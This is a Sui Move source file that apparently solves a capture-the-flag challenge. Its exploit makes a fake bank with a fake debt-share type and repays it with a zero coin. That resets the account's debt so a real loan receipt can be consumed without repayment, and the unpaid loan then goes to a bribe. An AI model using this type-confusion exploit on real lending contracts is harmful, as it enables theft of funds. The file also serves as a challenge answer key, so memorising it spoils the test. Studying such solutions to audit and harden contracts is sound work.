module solution::solution {
    use sui::coin::{Self, zero};
    use sui::transfer;
    use sui::tx_context::{TxContext};

    use challenge::otternaut_syndicate::{
        CryonUnderbank,
        CouncilGuard,
        S_CRYON_CREDITS,
        open_account,
        lend,
        repay,
        consume_receipt,
        bribe_guard,
        new_underbank
    };
    use challenge::cryon_credits::{CRYON_CREDITS};

    // Fake struct for fake debt shares
    public struct FAKE_S_CRYON_CREDITS has drop {}

    public fun solve(
        bank: &mut CryonUnderbank<CRYON_CREDITS, S_CRYON_CREDITS>,
        guard: &mut CouncilGuard,
        ctx: &mut TxContext
    ) {
        // 1. Open a real account. It needs to be mutable.
        let mut account = open_account<CRYON_CREDITS>(ctx);

        // 2. Create a fake bank with a fake debt share type. It also needs to be mutable.
        let supply = sui::balance::create_supply(FAKE_S_CRYON_CREDITS {});
        let (mut fake_bank, fake_bank_cap) = new_underbank<CRYON_CREDITS, FAKE_S_CRYON_CREDITS>(
            supply,
            0, // share_price doesn't matter for the exploit
            ctx
        );

        // 3. Borrow the required 3333 coins from the real bank.
        // This sets account.dx to 3333.
        let (loaned_coins, real_receipt) = lend(&mut account, bank, 3333, ctx);

        // 4. Create a zero-value coin for the fake repayment.
        let fake_repayment_coin = zero<CRYON_CREDITS>(ctx);
        
        // 5. Call repay on the FAKE bank.
        // This function will look for FAKE_S_CRYON_CREDITS debt shares in the account.
        // Since it finds none, it assumes the debt is 0 and incorrectly resets account.dx to 0.
        repay<CRYON_CREDITS, FAKE_S_CRYON_CREDITS>(&mut account, &mut fake_bank, fake_repayment_coin);

        // 6. Now that account.dx is 0, we can consume the real receipt, which would
        // otherwise fail.
        consume_receipt(&mut account, real_receipt);

        // 7. Use the borrowed funds (which we never repaid to the real bank) to bribe the guard.
        bribe_guard(guard, loaned_coins);

        // 8. Cleanup: Transfer all remaining objects to the sender to avoid drop errors.
        transfer::public_transfer(account, tx_context::sender(ctx));
        transfer::public_transfer(fake_bank_cap, tx_context::sender(ctx));
        transfer::public_transfer(fake_bank, tx_context::sender(ctx));
    }
}